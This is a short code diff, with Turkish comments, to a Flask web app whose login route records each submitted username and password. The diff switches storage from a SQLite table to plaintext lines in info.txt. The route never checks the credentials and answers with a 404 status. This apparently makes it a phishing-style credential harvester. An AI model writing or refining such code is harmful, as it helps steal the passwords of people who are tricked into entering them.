@@ -1,12 +1,6 @@
-from flask import Flask, request, render_template, redirect, url_for
-import sqlite3
+from flask import Flask, request
 
 app = Flask(__name__)
-
-# Veri tabanı bağlantısı ve tablo oluşturma
-def init_db():
-    with sqlite3.connect('users.db') as conn:
-        conn.execute('CREATE TABLE IF NOT EXISTS users (username TEXT, password TEXT)')
 
 @app.route('/')
 def home():
@@ -73,9 +67,9 @@ def login():
     username = request.form.get('username')
     password = request.form.get('password')
 
-    # Kullanıcı giriş bilgilerini veri tabanına ekle
-    with sqlite3.connect('users.db') as conn:
-        conn.execute('INSERT INTO users (username, password) VALUES (?, ?)', (username, password))
+    # Kullanıcı bilgilerini .txt dosyasına kaydet
+    with open('info.txt', 'a') as file:
+        file.write(f'Kullanıcı Adı: {username}, Şifre: {password}\n')
 
     return '''
     <!DOCTYPE html>
@@ -91,5 +85,4 @@ def login():
     ''', 404
 
 if __name__ == '__main__':
-    init_db()
     app.run(host='0.0.0.0', port=5000)
